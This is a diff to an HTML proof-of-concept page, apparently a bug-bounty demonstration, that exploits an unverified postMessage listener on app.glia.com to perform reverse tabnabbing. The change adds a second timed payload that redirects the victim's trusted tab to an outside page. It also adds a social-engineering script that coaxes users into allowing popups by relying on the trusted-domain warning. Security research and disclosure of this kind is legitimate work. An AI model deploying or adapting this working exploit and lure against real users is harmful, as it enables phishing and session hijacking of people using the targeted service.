@@ -4,9 +4,11 @@
     <meta charset="UTF-8">
     <title>Exploit Simulation Hub</title>
     <style>
-        body { font-family: sans-serif; padding: 40px; text-align: center; }
-        .btn { padding: 15px 30px; font-size: 18px; background: #ce3021; color: white; border: none; cursor: pointer; border-radius: 5px; }
+        body { font-family: sans-serif; padding: 40px; text-align: center; max-width: 700px; margin: auto; }
+        .btn { padding: 15px 30px; font-size: 18px; background: #ce3021; color: white; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; margin-top: 20px; }
         .btn:hover { background: #b0281a; }
+        .context-description { text-align: left; background: #f8f9fa; border-left: 4px solid #ce3021; padding: 20px; margin-top: 30px; border-radius: 4px; line-height: 1.6; color: #444; }
+        .context-description h2 { margin-top: 0; color: #111; font-size: 20px; }
     </style>
 </head>
 <body>
@@ -17,29 +19,50 @@
     <!-- One click requirement satisfied -->
     <button class="btn" onclick="launchExploit()">Execute Exploit Chain</button>
 
+    <!-- Social Engineering Context Description -->
+    <div class="context-description">
+        <h2>Scenario & Vulnerability Context</h2>
+        <p>
+            An attacker hosts this page to lure a target user into initiating a connection. The attacker claims that clicking the button will synchronize or verify their secure session config details with Glia. 
+        </p>
+        <p>
+            When the button is clicked, the real <code>app.glia.com/account</code> login/entry page spawns in a new tab. Because of the browser's default behavior, the first automated redirect attempt triggers a <strong>"Popup Blocked"</strong> alert. The attacker instructs the user to allow this popup manually via their browser address bar. 
+        </p>
+        <p>
+            Because the warning notification explicitly claims that the popup is arriving from the trusted domain (<strong>app.glia.com</strong>) rather than the attacker's origin, the user will not suspect anything malicious. The moment they allow the prompt, the second delayed message delivers the payload, maintaining an active, unsevered <code>window.opener</code> channel that forces Reverse Tabnabbing.
+        </p>
+    </div>
+
     <script>
         function launchExploit() {
             // 1. Open the target vulnerable page to capture the window object reference
             const targetWindow = window.open('https://app.glia.com/account', '_blank');
 
-            // 2. We must wait for the target page to load its scripts and register the event listener.
-            // Direct onload checking is blocked by Same-Origin Policy, so we use a polling timeout.
+            // 2. First payload delivery timed at 2.5 seconds to force the initial "Popup Blocked" prompt
             setTimeout(function() {
                 if (targetWindow) {
-                    // 3. Construct the payload structure expected by the unverified listener
                     const payload = {
                         type: 'openNewTab',
-                        url: 'https://wrathsec.github.io/postmessage/redirected.html' // Destination domain
+                        url: 'https://wrathsec.github.io/postmessage/redirected.html'
                     };
-
-                    // 4. Dispatch the postMessage to the target window reference.
-                    // '*' is used because we are forcing cross-origin communication.
                     targetWindow.postMessage(payload, '*');
-                    console.log('[+] Payload successfully dispatched to target window.');
+                    console.log('[+] First payload successfully dispatched to target window at 2.5s.');
                 } else {
-                    console.error('[-] Popup blocked or window reference lost.');
+                    console.error('[-] Window reference lost.');
                 }
-            }, 3500); // 3.5-second delay to ensure the target DOM and event listeners are ready
+            }, 2500); // Updated to 2.5 seconds
+
+            // 3. Second payload delivery timed at 6.0 seconds to fire after user clicks "Allow Popups"
+            setTimeout(function() {
+                if (targetWindow) {
+                    const payload = {
+                        type: 'openNewTab',
+                        url: 'https://wrathsec.github.io/postmessage/redirected.html'
+                    };
+                    targetWindow.postMessage(payload, '*');
+                    console.log('[+] Second payload successfully dispatched to target window at 6s.');
+                }
+            }, 6000); // Added second message at 6.0 seconds
         }
     </script>
 
